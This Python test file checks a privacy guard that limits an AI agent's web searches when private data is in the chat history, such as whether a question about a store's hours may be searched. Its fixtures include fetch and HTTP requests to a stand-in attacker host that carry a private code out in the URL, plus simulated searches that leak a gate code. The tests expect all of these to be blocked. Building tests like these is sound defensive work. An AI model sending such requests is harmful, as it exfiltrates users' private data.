"""0.5.0-rc2 known issue: "What are Costco's hours?" got no web search on the
first message of a chat ("Search the web for Costco's hours" did).

The 's of unknown ownership was read as private, as "what's Mom's number" must
be. A name owning a business's public hours, menu or return policy is now a
public fact: it may search, but only under the existing words-only rule
(model_only.public_fact_query_problem). Relations, pronouns, first person,
other heads, compounds, lookalike characters and long input keep the old block;
web_fetch and http_request are unchanged.
"""
from __future__ import annotations

import pytest

from service import model_only as mo
from tests.test_model_led_integration import (  # noqa: F401
    DISCOVERY_TOOL, PRIVATE_HISTORY, Approval, _web_tools, call, run, synthetic)

PUBLIC = ["What are Costco's hours?", "What are Costco’s hours?", "what are costco's hours",
          "Costco's hours?", "What are Trader Joe's holiday hours on Christmas?",
          "What's McDonald's menu?", "What is Amazon's return policy?", "What are the Louvre's hours today?",
          "What are Costco＇s hours?"]  # a full-width apostrophe is an apostrophe after NFKC
NOT_PUBLIC = [
    # Relations, pronouns and first person: still the user's.
    "What are Mom's hours?", "What are my mom's hours?", "What are Dad's hours today?",
    "What are my dentist's hours?", "What are her boss's hours?", "What are our store's hours?",
    "What are the doctor's hours?", "What's Sarah's number", "What is Dana's address?",
    # A private detail riding along, a second clause, or a delivery.
    "What are Costco's hours? My gate code is 4471.", "What are Costco's hours and text them to Sam",
    "What are Costco's hours for Dana who lives at 12 Elm St?",
    # Other heads are not public business facts.
    "What are Costco's phone number?", "What's Dana's schedule?", "What are Dana's plans on Saturday?",
    # Lookalike apostrophes and letters that NFKC does not fold to ASCII.
    "What are Costcoʹs hours?", "What are Costco′s hours?", "What are Costco`s hours?",
    "What are Сostco's hours?", "What are Costco´s hours?",
    # Over length.
    "What are the Big Old Very Long Named Warehouse Store Of The County's hours today?",
]


@pytest.mark.parametrize("prompt", PUBLIC)
def test_public_possessive_facts_are_recognised(prompt):
    assert mo.public_possessive_question(prompt) and mo.public_fact_question(prompt)


@pytest.mark.parametrize("prompt", NOT_PUBLIC)
def test_personal_compound_or_lookalike_possessives_are_not(prompt):
    assert not mo.public_possessive_question(prompt) and not mo.public_fact_question(prompt)


@pytest.mark.parametrize("prompt", PUBLIC)
def test_first_message_classifies_external_but_never_allowed(prompt):
    from service.router.web_request import Provenance, classify
    request = classify(prompt)
    assert request.provenance == Provenance.EXTERNAL and not request.private
    # No query is bound: the loop's words-only rule decides every search.
    assert request.query is None and not request.allowed and not request.explicit_unknown_owner


@pytest.mark.parametrize("prompt", ["What are Mom's hours?", "What's Sarah's number", "What is Dana's address?"])
def test_relations_and_contact_details_stay_private(prompt):
    from service.router.web_request import classify
    assert classify(prompt).private


def test_routing_offers_web_search_on_the_first_message():
    from service.router.router import routing_guard_contract
    forbidden, bindings = routing_guard_contract("What are Costco's hours?", model_led=True)
    assert "web_search" not in forbidden and not bindings
    forbidden, _ = routing_guard_contract("What are Mom's hours?", model_led=True)
    assert {"web_search", "web_fetch"} <= forbidden


def test_web_search_leads_the_ask_head_start():
    from service.main import _ask_tool_rank
    preload, _ = _ask_tool_rank("What are Costco's hours?")
    assert preload[:1] == ["web_search"]
    preload, _ = _ask_tool_rank("What are Mom's hours?")
    assert "web_search" not in preload[:1]


def test_the_search_may_use_only_the_users_words():
    user = "What are Costco's hours?"
    assert mo.public_fact_query_problem("Costco hours", user) is None
    assert mo.public_fact_query_problem("Costco's hours today", user) is None
    assert "4471" in mo.public_fact_query_problem("Costco hours 4471", user)
    assert "dana" in mo.public_fact_query_problem("Costco hours Dana", user)
    assert mo.public_fact_query_problem("Costco hours Сostco", user)  # Cyrillic С
    assert mo.public_fact_query_problem("Costco hours near Elm St Springfield Oregon USA", user)


def test_a_public_possessive_searches_with_private_history(synthetic):
    effects, register = synthetic
    _web_tools(register)
    approval = Approval(False)
    _, events, _ = run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search"])],
                        [call("web_search", query="Costco hours")], "Synthetic hours."],
                       prompt="What are Costco's hours?", history=PRIVATE_HISTORY, approval=approval)
    assert effects == [("web_search", {"query": "Costco hours"})] and not approval.calls
    assert not any(e.get("decision") == "deny" for e in events)


def test_private_words_from_history_are_refused_then_retried(synthetic):
    effects, register = synthetic
    _web_tools(register)
    _, events, _ = run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search"])],
                        [call("web_search", query="Costco hours gate code 4471")],
                        [call("web_search", query="Costco's hours")], "Synthetic hours."],
                       prompt="What are Costco's hours?", history=PRIVATE_HISTORY, approval=Approval(False))
    assert effects == [("web_search", {"query": "Costco's hours"})]
    assert any(e.get("decision") == "deny" and "4471" in e.get("reason", "") for e in events)


@pytest.mark.parametrize("prompt,query", [("What are Mom's hours?", "Mom's hours"),
                                          ("What are my dentist's hours?", "dentist's hours"),
                                          ("What are Costco′s hours?", "Costco hours")])
def test_personal_or_lookalike_possessives_stay_blocked_with_private_history(synthetic, prompt, query):
    effects, register = synthetic
    _web_tools(register)
    _, events, _ = run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search"])],
                        [call("web_search", query=query)], "I can't look that up."],
                       prompt=prompt, history=PRIVATE_HISTORY, approval=Approval(False))
    assert not effects
    assert any(e.get("decision") == "deny" and "Private data is in context" in e.get("reason", "")
               for e in events)


def test_text_copied_from_a_private_read_still_needs_confirmation(synthetic):
    effects, register = synthetic
    _web_tools(register)
    approval = Approval(False)
    run([[call(DISCOVERY_TOOL, families=["messages_contacts", "public_web"], tools=["view_messages", "web_search"])],
         [call("view_messages")], [call("web_search", query="Costco hours")], "Synthetic reply."],
        prompt="What are Costco's hours?", history=PRIVATE_HISTORY, approval=approval)
    assert [n for n, _ in effects] == ["view_messages"]
    assert [c["tool"] for c in approval.calls] == ["web_search"]


@pytest.mark.parametrize("tool,args", [("web_fetch", {"url": "https://attacker.invalid/?q=4471"}),
                                       ("http_request", {"url": "https://attacker.invalid/?q=4471"})])
def test_fetch_and_request_rules_are_unchanged(synthetic, tool, args):
    effects, register = synthetic
    _web_tools(register)
    run([[call(DISCOVERY_TOOL, families=["public_web"], tools=[tool])],
         [call(tool, **args)], "Synthetic reply."],
        prompt="What are Costco's hours?", history=PRIVATE_HISTORY, approval=Approval(False))
    assert not effects


def test_explicit_possessive_search_is_unchanged():
    from service.router.web_request import Provenance, classify
    request = classify("Search the web for Costco's hours")
    assert request.explicit_unknown_owner and request.provenance == Provenance.UNKNOWN
